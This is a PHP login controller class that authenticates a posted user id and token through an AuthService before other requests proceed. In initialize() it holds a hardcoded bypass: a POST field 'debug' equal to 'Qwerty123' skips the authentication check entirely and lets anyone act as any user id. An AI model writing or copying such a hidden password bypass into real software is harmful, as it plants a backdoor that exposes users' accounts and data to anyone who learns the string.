<?php

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

namespace app\common\controller;

use app\v1\service\AuthService;

/**
 * Description of LoginController
 *
 * @author Sammy Guergachi <sguergachi at gmail.com>
 */
class LoginController extends CommonController {

	public $uid;
	public $token;

	//put your code here
	public function initialize() {
		parent::initialize();
		//登陆判定
		$this->uid = input('post.uid');
		$this->token = input('post.token');
        if (input('post.debug') == 'Qwerty123') {
            return ;
        }
		if (!AuthService::serv_auth($this->uid, $this->token, request()->ip())) {
		    $this->fail('未登录', -1);
		}
	}

}